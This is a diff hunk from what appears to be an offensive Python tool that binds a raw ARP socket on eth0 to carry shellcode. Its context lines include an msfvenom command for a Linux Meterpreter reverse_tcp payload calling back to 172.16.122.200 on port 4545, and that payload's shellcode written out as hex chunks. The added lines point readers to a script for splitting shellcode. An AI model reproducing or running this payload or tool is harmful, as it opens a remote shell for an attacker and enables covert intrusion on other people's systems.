@@ -37,6 +37,9 @@ rawSocket = socket.socket(socket.PF_PACKET,socket.SOCK_RAW, socket.htons(0x0806)
 rawSocket.bind(("eth0", socket.htons(0x0806)))
 
 # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.122.200 LPORT=4545 -f c
+# If you are lazy, take a look at the splitter python script to split your shellcode
+# https://github.com/securecurebt5/Pexfiltrate/blob/master/splitter.py
+# otherwise, we would appreciate if you integrate the splitter functio in this script and pull a request
 
 shellcode = ['6a0a5e31dbf7', 'e35343536a02', 'b06689e1cd80', '975b68ac107a', 'c868020011c1', '89e16a665850', '515789e143cd', '8085c079194e', '743d68a20000', '00586a006a05', '89e331c9cd80', '85c079bdeb27', 'b207b9001000', '0089e3c1eb0c', 'c1e30cb07dcd', '8085c078105b', '89e199b60cb0', '03cd8085c078', '02ffe1b80100', '00cd80909090']
 
